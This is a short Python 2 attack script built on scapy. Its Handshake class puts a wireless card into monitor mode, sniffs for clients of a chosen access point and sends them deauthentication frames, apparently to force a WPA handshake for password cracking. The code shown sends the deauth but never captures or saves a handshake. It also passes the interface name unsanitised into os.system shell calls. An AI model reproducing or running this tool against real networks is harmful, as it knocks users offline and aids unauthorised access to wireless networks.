from gen_utils import *
from deauth import Deauth
from scapy.all import *

class Handshake:
    def __init__(self, iface = "wlan0", DEBUG = False, name="hanshake.pkt"):
        self.iface = iface
        if os.system("iwconfig " + self.iface + "| grep Monitor >/dev/null 2>&1") != 0:
            try:
                self.iface = switch_to_monitor(iface)
            except invalidIface:
                raise Exception("invalidIface")
        self.debug = DEBUG
        self.name = name
        self.clients = []
        self.APmac = ""
        self.deauth = Deauth(iface = self.iface)
        if self.debug:
            print self.iface
            print self.name

    def __scan_clients(self,pkt):
        if pkt.haslayer(Dot11):
            if pkt.addr1 and pkt.addr2:
                if pkt.addr1.lower() == self.APmac.lower():
                    self.clients.append(pkt.addr2)

    def show_networks(self):
        self.deauth.show_networks()

    def get_handshake(self, APmac, channel):
        self.APmac = APmac
        print "[*] Scanning for clients"
        sniff(iface=self.iface, prn=self.__scan_clients, timeout = 15)
        os.system("iwconfig %s channel %d" % (self.iface, channel))
        self.deauth.deauth(bssid = self.APmac, client = self.clients[0], count = 10)
        
